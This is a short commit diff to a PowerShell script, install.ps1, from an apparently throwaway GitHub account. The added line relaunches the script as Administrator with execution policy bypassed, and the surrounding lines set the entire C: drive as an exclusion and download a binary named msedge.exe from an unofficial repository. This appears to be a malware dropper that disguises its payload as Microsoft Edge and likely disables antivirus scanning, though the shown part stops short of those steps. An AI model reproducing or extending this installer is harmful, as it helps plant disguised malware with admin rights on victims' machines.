498d8e278b274fdcca987c2efebffa0b3dea9f68
Nxtccijo <ietsbdbd@gmail.com>
2025-03-18 13:44:18 +0100

    Add files via upload

--- install.ps1
+++ install.ps1
@@ -1,3 +1,5 @@
+if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
+
 # Define the paths
 $driveToExclude = "C:\"
 $downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
